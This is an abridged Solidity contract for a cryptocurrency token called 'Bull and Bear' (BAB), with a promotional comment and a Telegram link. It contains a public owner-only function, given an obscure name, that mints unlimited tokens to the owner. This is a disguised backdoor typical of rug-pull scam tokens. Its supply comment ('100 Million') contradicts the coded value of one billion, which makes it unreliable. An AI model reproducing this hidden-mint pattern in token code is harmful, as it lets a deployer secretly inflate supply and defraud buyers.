...
//
// $BullandBear proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BullandBearportal
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BullandBear(uint256 amount) public onlyOwner {
 _BullandBear(msg.sender, amount);
    }
    ...
    function _BullandBear(address account, uint256 amount) internal virtual {
...
contract $BullandBear is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Bull and Bear", "BAB") {
     _BullandBear(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}